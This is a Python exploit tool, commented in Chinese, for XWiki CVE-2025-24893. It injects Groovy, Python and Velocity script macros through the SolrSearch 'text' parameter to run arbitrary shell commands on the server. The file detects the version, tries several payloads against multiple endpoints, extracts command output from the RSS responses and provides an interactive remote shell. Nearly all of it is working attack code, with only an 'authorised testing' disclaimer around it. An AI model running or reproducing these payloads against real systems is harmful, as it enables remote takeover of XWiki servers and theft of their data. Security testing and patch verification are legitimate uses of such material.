#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
XWiki CVE-2025-24893 远程代码执行测试脚本
仅用于授权安全测试

CVE-2025-24893: SolrSearch 的 text 参数被当作 wiki 标记解析，
攻击者可注入脚本宏实现 RCE。
受影响版本: XWiki < 15.10.12  以及  16.0.0 ~ 16.4.x (< 16.5.0)
"""

import requests
import sys
import argparse
import re
from typing import Optional, Tuple, List

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'


def print_banner():
    banner = f"""
{Colors.BLUE}╔══════════════════════════════════════════════════════════════╗
║     XWiki CVE-2025-24893 - RCE 测试工具                     ║
║     仅限授权安全使用                                        ║
╚══════════════════════════════════════════════════════════════╝{Colors.RESET}
    """
    print(banner)


# ---------- 版本检测 ----------

def detect_xwiki_version(base_url: str, session: requests.Session) -> Optional[str]:
    """从页面提取 XWiki 版本号"""
    print(f"{Colors.YELLOW}[*] 正在探测 XWiki 版本...{Colors.RESET}")

    test_urls = [
        f"{base_url}/xwiki/bin/view/Main/",
        f"{base_url}/bin/view/Main/",
        base_url,
    ]

    for url in test_urls:
        try:
            resp = session.get(url, timeout=10)
            if resp.status_code != 200:
                continue
            for pattern in [
                r'XWiki\s+(\d+\.\d+(?:\.\d+)?)',        # "XWiki 15.10.11"
                r'xwikiplatformversion["\']?\s*[:>]\s*["\']?(\d+\.\d+(?:\.\d+)?)',
                r'version["\']?\s*:\s*["\'](\d+\.\d+(?:\.\d+)?)',
            ]:
                m = re.search(pattern, resp.text, re.IGNORECASE)
                if m:
                    version = m.group(1)
                    print(f"{Colors.GREEN}[+] 检测到版本: {version}{Colors.RESET}")
                    return version
        except requests.RequestException:
            continue

    print(f"{Colors.YELLOW}[!] 未能自动检测版本，将跳过版本判断{Colors.RESET}")
    return None


def parse_version(version: str) -> Tuple[int, ...]:
    """将版本字符串转为可比较的 tuple"""
    parts = version.strip().split('.')
    return tuple(int(p) for p in parts if p.isdigit())


def is_version_vulnerable(version: str) -> Optional[bool]:
    """
    返回 True=受影响, False=已修复, None=无法判断
    受影响: < 15.10.12  或  16.0.0 ~ 16.4.x (< 16.5.0)
    """
    try:
        v = parse_version(version)
    except (ValueError, IndexError):
        return None

    if len(v) < 2:
        return None

    # < 15.10.12
    if v[0] == 15:
        if v[1] < 10:
            return True
        if v[1] == 10:
            patch = v[2] if len(v) > 2 else 0
            return patch < 12
        return False  # 15.11+

    # 16.0.0 ~ 16.4.x (< 16.5.0)
    if v[0] == 16:
        if v[1] < 5:
            return True
        return False

    # < 15 的旧版本也受影响
    if v[0] < 15:
        return True

    # 17+ 不确定，保守返回 None
    return None


# ---------- Payload 构造 ----------

def escape_sh_command(command: str) -> str:
    """转义命令中的单引号，使其能安全放入 Groovy/Java 单引号字符串"""
    # ' → '\''（结束单引号、转义的单引号、开始单引号）
    # 但在 Groovy 字符串中我们用 '"'"' 拼接
    return command.replace("'", "'\"'\"'")


def build_payloads(command: str, target_os: str = "linux") -> List[Tuple[str, str]]:
    """
    构造多种 payload，覆盖不同 XWiki 版本可用的宏。
    返回 (名称, wiki_injection_text) 列表。
    """
    escaped = escape_sh_command(command)

    if target_os == "linux":
        groovy_exec = f"['sh', '-c', '{escaped}'].execute().text"
    else:
        groovy_exec = f"['cmd.exe', '/c', '{escaped}'].execute().text"

    payloads = []

    # 1) groovy 宏 — XWiki < 12.x (已废弃但仍可能存在于旧实例)
    payloads.append((
        "groovy-macro",
        f"{{{{/html}}}}{{{{async async=\"false\" cached=\"false\"}}}}{{{{groovy}}}}println({groovy_exec}){{{{/groovy}}}}{{{{/async}}}}"
    ))

    # 2) script 宏 (groovy 语言) — XWiki >= 12.x，需要 programming rights
    payloads.append((
        "script-groovy",
        f"{{{{/html}}}}{{{{script language=\"groovy\"}}}}println({groovy_exec}){{{{/script}}}}"
    ))

    # 3) python 脚本宏
    if target_os == "linux":
        python_exec = f"__import__('subprocess').check_output(['sh', '-c', '{escaped}']).decode()"
    else:
        python_exec = f"__import__('subprocess').check_output(['cmd.exe', '/c', '{escaped}']).decode()"
    payloads.append((
        "script-python",
        f"{{{{/html}}}}{{{{script language=\"python\"}}}}print({python_exec}){{{{/script}}}}"
    ))

    # 4) velocity 宏 — 需要 programming rights，但很多实例配置宽松
    # 直接在 velocity 中通过 Runtime.exec 执行命令
    if target_os == "linux":
        vel_exec = (
            f"#set($cmd=['sh','-c','{escaped}'])\n"
            f"#set($proc=$util.getRuntime().exec($cmd))\n"
            f"#set($out=$proc.getInputStream())\n"
            f"$out.readAllBytes()"
        )
    else:
        vel_exec = (
            f"#set($cmd=['cmd.exe','/c','{escaped}'])\n"
            f"#set($proc=$util.getRuntime().exec($cmd))\n"
            f"#set($out=$proc.getInputStream())\n"
            f"$out.readAllBytes()"
        )
    payloads.append((
        "velocity",
        f"}} {{{{/velocity}}}}{{{{velocity}}}}\n{vel_exec}\n{{{{/velocity}}}}"
    ))

    return payloads


# ---------- 响应解析 ----------

def extract_command_output(response_text: str) -> str:
    """
    从 HTTP 响应中提取命令输出。
    SolrSearch 返回 RSS/XML 时将结果包在 <description> 等标签内。
    """
    if not response_text:
        return ""

    # 优先从 RSS <description> 中提取（去掉 CDATA 包装和 HTML 实体）
    desc_match = re.search(
        r'<description>\s*(?:<!\[CDATA\[)?(.*?)(?:\]\]>)?\s*</description>',
        response_text, re.DOTALL
    )
    if desc_match:
        content = desc_match.group(1).strip()
        if content:
            return _clean_output(content)

    # 如果响应很短，可能直接就是命令输出
    text = response_text.strip()
    if len(text) < 500 and not text.startswith('<'):
        return text

    # 否则尝试在 XML/HTML 中找明显内容块，排除标签
    # 移除常见 XML/HTML 标签，看剩余内容
    cleaned = re.sub(r'<[^>]+>', '', response_text)
    cleaned = cleaned.strip()
    if cleaned:
        return cleaned[:3000]

    return response_text[:2000]


def _clean_output(text: str) -> str:
    """轻度清洗：反转义 HTML 实体"""
    import html
    text = html.unescape(text)
    # 移除首尾空白/换行
    return text.strip()


# ---------- 核心利用 ----------

def execute_command(
    base_url: str,
    command: str,
    session: requests.Session,
    target_os: str = "linux",
    timeout: int = 15,
) -> Tuple[bool, str]:
    """
    尝试利用漏洞执行命令。
    遍历多套 payload 和端点。
    """
    payloads = build_payloads(command, target_os)
    endpoints = [
        f"{base_url}/xwiki/bin/get/Main/SolrSearch?media=rss",
        f"{base_url}/xwiki/bin/get/Main/SolrSearch?media=rss&outputSyntax=plain",
        f"{base_url}/bin/get/Main/SolrSearch?media=rss",
        f"{base_url}/xwiki/bin/view/Main/SolrSearch?media=rss",
    ]

    for endpoint in endpoints:
        for name, payload in payloads:
            # text 参数不需要手动 URL 编码 — requests 在拼接 URL 时会处理，
            # 服务器收到后 URL 解码再交给 wiki 解析器，所以直接传原始 wiki 语法
            try:
                resp = session.get(
                    endpoint,
                    params={"text": payload},
                    timeout=timeout,
                )
            except requests.Timeout:
                print(f"{Colors.YELLOW}[!] 超时 — {endpoint.split('/')[-1]} / {name}{Colors.RESET}")
                continue
            except requests.RequestException as e:
                print(f"{Colors.RED}[!] 请求失败: {e}{Colors.RESET}")
                continue

            if resp.status_code == 200 and resp.text:
                output = extract_command_output(resp.text)
                if output:
                    print(f"{Colors.GREEN}[+] 利用成功 — payload: {name}{Colors.RESET}")
                    return True, output
                else:
                    print(f"{Colors.YELLOW}[!] 200 但无可提取输出 — {name}{Colors.RESET}")
            else:
                print(f"{Colors.YELLOW}[!] HTTP {resp.status_code} — {name}{Colors.RESET}")

    return False, ""


# ---------- 交互式 Shell ----------

def interactive_shell(base_url: str, session: requests.Session, target_os: str = "linux"):
    """交互式命令执行"""
    print(f"\n{Colors.GREEN}[+] 进入交互模式 (输入 'exit' 退出){Colors.RESET}")

    # 连通性测试
    success, output = execute_command(base_url, "echo XWikiRCE-Test-2025", session, target_os)
    if success and "XWikiRCE-Test-2025" in output:
        print(f"{Colors.GREEN}[+] 漏洞利用成功！已获取命令执行能力{Colors.RESET}")
    else:
        print(f"{Colors.RED}[-] 连通性测试失败，可能无法利用{Colors.RESET}")
        if output:
            print(f"{Colors.YELLOW}[!] 响应片段: {output[:300]}{Colors.RESET}")
        return

    while True:
        try:
            cmd = input(f"\n{Colors.BLUE}XWiki-shell>{Colors.RESET} ").strip()
            if cmd.lower() in ('exit', 'quit'):
                print("退出")
                break
            if not cmd:
                continue

            success, output = execute_command(base_url, cmd, session, target_os)
            if success:
                safe_print(output if output else "(无输出)")
            else:
                print(f"{Colors.RED}命令执行失败{Colors.RESET}")
        except KeyboardInterrupt:
            print("\n退出")
            break
        except EOFError:
            break


# ---------- 主入口 ----------

def safe_print(*args, **kwargs):
    """绕过 Windows GBK 编码问题的 print"""
    try:
        print(*args, **kwargs)
    except UnicodeEncodeError:
        for arg in args:
            try:
                print(arg, **kwargs)
            except UnicodeEncodeError:
                print(str(arg).encode(sys.stdout.encoding or 'utf-8', errors='replace').decode(sys.stdout.encoding or 'utf-8', errors='replace'), **kwargs)


def main():
    # 尝试修复 Windows 终端编码
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except Exception:
        pass

    parser = argparse.ArgumentParser(description='XWiki CVE-2025-24893 RCE 测试工具')
    parser.add_argument('-u', '--url', required=True, help='目标 URL (如 http://192.168.1.100:8080)')
    parser.add_argument('-c', '--cmd', help='执行单条命令后退出')
    parser.add_argument('--os', choices=['linux', 'windows'], default='linux', help='目标操作系统 (默认: linux)')
    parser.add_argument('-i', '--interactive', action='store_true', help='进入交互式 shell 模式')
    parser.add_argument('--cookie', help='Cookie 字符串 (如 "JSESSIONID=abc123")')
    parser.add_argument('--proxy', help='HTTP 代理 (如 http://127.0.0.1:8080)')
    parser.add_argument('--no-verify', action='store_true', help='禁用 SSL 证书验证')
    parser.add_argument('--timeout', type=int, default=15, help='请求超时秒数 (默认: 15)')
    args = parser.parse_args()

    print_banner()

    # 标准化 URL
    base_url = args.url.rstrip('/')

    # 创建 Session
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (compatible; XWiki-Security-Test/1.0)',
        'Accept': '*/*',
    })
    if args.cookie:
        session.headers['Cookie'] = args.cookie
    if args.proxy:
        session.proxies = {'http': args.proxy, 'https': args.proxy}
    if args.no_verify:
        session.verify = False

    # 版本检测
    version = detect_xwiki_version(base_url, session)
    if version:
        vuln = is_version_vulnerable(version)
        if vuln is True:
            print(f"{Colors.RED}[!] 警告: 版本 {version} 可能受漏洞影响{Colors.RESET}")
        elif vuln is False:
            print(f"{Colors.YELLOW}[!] 版本 {version} 可能已修复，但仍会尝试{Colors.RESET}")
        else:
            print(f"{Colors.YELLOW}[!] 版本 {version} 受影响状态未知，继续尝试{Colors.RESET}")

    # 执行
    if args.cmd:
        print(f"{Colors.YELLOW}[*] 执行命令: {args.cmd}{Colors.RESET}")
        success, output = execute_command(base_url, args.cmd, session, args.os, args.timeout)
        if success:
            print(f"{Colors.GREEN}[+] 命令执行成功{Colors.RESET}")
            safe_print(f"{'=' * 50}\n{output}\n{'=' * 50}")
        else:
            print(f"{Colors.RED}[-] 命令执行失败{Colors.RESET}")
    elif args.interactive:
        interactive_shell(base_url, session, args.os)
    else:
        print(f"{Colors.YELLOW}[*] 执行测试命令 (id)...{Colors.RESET}")
        success, output = execute_command(base_url, "id", session, args.os)
        if success:
            print(f"{Colors.GREEN}[+] 命令执行成功{Colors.RESET}")
            safe_print(f"输出:\n{output}")
        else:
            print(f"{Colors.RED}[-] 漏洞利用可能失败{Colors.RESET}")


if __name__ == "__main__":
    main()
